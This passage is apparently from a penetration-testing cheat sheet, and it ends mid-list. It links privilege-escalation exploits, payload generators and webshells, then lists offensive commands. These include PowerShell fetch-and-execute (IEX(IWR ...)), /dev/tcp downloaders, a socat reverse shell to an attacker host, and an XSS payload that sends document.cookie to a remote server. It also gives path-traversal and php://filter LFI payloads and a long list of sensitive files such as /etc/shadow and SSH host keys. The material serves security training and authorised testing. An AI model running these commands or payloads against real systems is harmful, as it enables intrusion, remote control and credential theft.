| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Payloads

| Name | URL |
| --- | --- |
| AMSI.fail | http://amsi.fail |
| Donut | https://github.com/TheWover/donut |
| Freeze | https://github.com/optiv/Freeze |
| hoaxshell | https://github.com/t3l3machus/hoaxshell |
| Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
| marshalsec | https://github.com/mbechler/marshalsec |
| nishang | https://github.com/samratashok/nishang |
| Payload Box | https://github.com/payloadbox |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| PowerLine | https://github.com/fullmetalcache/powerline |
| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')) |
| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | https://github.com/optiv/ScareCrow |
| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
| unicorn | https://github.com/trustedsec/unicorn |
| Veil | https://github.com/Veil-Framework/Veil |
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
| ysoserial | https://github.com/frohoff/ysoserial |
| ysoserial.net | https://github.com/pwntester/ysoserial.net |

### Wordlists

| Name | URL |
| --- | --- |
| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |

### Social Media Resources

| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |

## Commands

### Basics

#### curl

```c
curl -v http://<DOMAIN>                                                        // verbose output
curl -X POST http://<DOMAIN>                                                   // use POST method
curl -X PUT http://<DOMAIN>                                                    // use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080                                             // use proxy
curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
```

#### Chisel

##### Reverse Pivot

```c
./chisel server -p 9002 -reverse -v
./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
```

##### SOCKS5 / Proxychains Configuration

```c
./chisel server -p 9002 -reverse -v
./chisel client <LHOST>:9002 R:socks
```

#### File Transfer

##### Certutil

```c
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

##### Netcat

```c
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

##### Impacket

```c
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

##### PowerShell

```c
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

##### Bash only

###### wget version

Paste directly to the shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```c
__wget http://<LHOST>/<FILE>
```

###### curl version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

#### FTP

```c
ftp <RHOST>
wget -r ftp://anonymous:anonymous@<RHOST>
```

#### Kerberos

```c
sudo apt-get install krb5-kdc
```

```c
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache
export KRB5CCNAME='realpath <FILE>.ccache'
```

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

#### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

##### Download Proxy and Agent

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

##### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

##### Setup Proxy on Attacker Machine

```c
./proxy -laddr <LHOST>:443 -selfcert
```

##### Setup Agent on Target Machine

```c
./agent -connect <LHOST>:443 -ignore-cert
```

##### Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

#### Linux

##### CentOS

```c
doas -u <USERNAME> /bin/sh
```

##### Environment Variables

```c
export PATH=`pwd`:$PATH
```

##### gcc

```c
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

##### getfacl

```c
getfacl <LOCAL_DIRECTORY>
```

##### iconv

```c
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

##### vi

```c
:w !sudo tee %    # save file with elevated privileges without exiting
```

##### Windows Command Formatting

```c
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

#### Microsoft Windows

##### dir

```c
dir flag* /s /p
dir /s /b *.log
```

#### PHP Webserver

```c
sudo php -S 127.0.0.1:80
```

#### Ping

```c
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

#### Python Webserver

```c
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### RDP

```c
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
rdesktop <RHOST>
```

#### showmount

```c
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

#### smbclient

```c
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

##### Download multiple files at once

```c
mask""
recurse ON
prompt OFF
mget *
```

##### Upload multiple Files at once

```c
recurse ON
prompt OFF
mput *
```

#### socat

```c
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

```c
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

```c
socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
```

#### SSH

```c
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1

ssh -R 8080:<LHOST>:80 <RHOST>
ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>

ssh -L 80:<LHOST>:80 <RHOST>
ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
ssh -L 80:localhost:80 <RHOST>
```

#### Time and Date

##### Get the Server Time

```c
sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

##### Stop virtualbox-guest-utils to stop syncing Time

```c
sudo /etc/init.d/virtualbox-guest-utils stop
```

##### Stop systemd-timesyncd to sync Time manually

```c
sudo systemctl stop systemd-timesyncd
```

##### Disable automatic Sync

```c
sudo systemctl disable --now chronyd
```

##### Options to set the Date and Time

```c
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

##### Keep in Sync with a Server

```c
while [ 1 ]; do sudo ntpdate <RHOST>;done
```

#### Tmux

```c
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```c
:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
```

Search
```c
ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

Logging
```c
ctrl b
shift + P    # start / stop
```

Save Output
```c
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

#### Upgrading Shells

```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

Alternatively:

```c
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Oneliner

```c
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Fixing Staircase Effect

```c
env reset
```

or

```c
stty onlcr
```

#### VirtualBox

```c
sudo pkill VBoxClient && VBoxClient --clipboard
```

#### virtualenv

```c
sudo apt-get install virtualenv
virtualenv -p python2.7 venv
. venv/bin/activate
```

```c
python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
```

### Information Gathering

#### memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
```

#### NetBIOS

```c
nbtscan <RHOST>
nmblookup -A <RHOST>
```

#### Nmap

```c
sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

#### Port Scanning

```c
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### snmpwalk

```c
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

### Web Application Analysis

#### Burp Suite

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

#### Set Proxy Environment Variables

```c
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

#### cadaver

```c
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

```c
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

#### Cross-Site Scripting (XSS)

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

#### ffuf

```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

##### API Fuzzing

```c
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

##### Searching for LFI

```c
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

##### Fuzzing with PHP Session ID

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

##### Recursion

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

##### File Extensions

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

##### Rate Limiting

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

##### Virtual Host Discovery

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

##### Massive File Extension Discovery

```c
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

#### GitTools

```c
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

#### Gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

##### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

##### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

##### POST Requests

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

##### DNS Recon

```c
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### VHost Discovery

```c
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

##### Specifiy User Agent

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

#### Local File Inclusion (LFI)

```c
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
##### Until php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

##### Null Byte

```c
%00
0x00
```

##### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

##### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

##### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

##### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
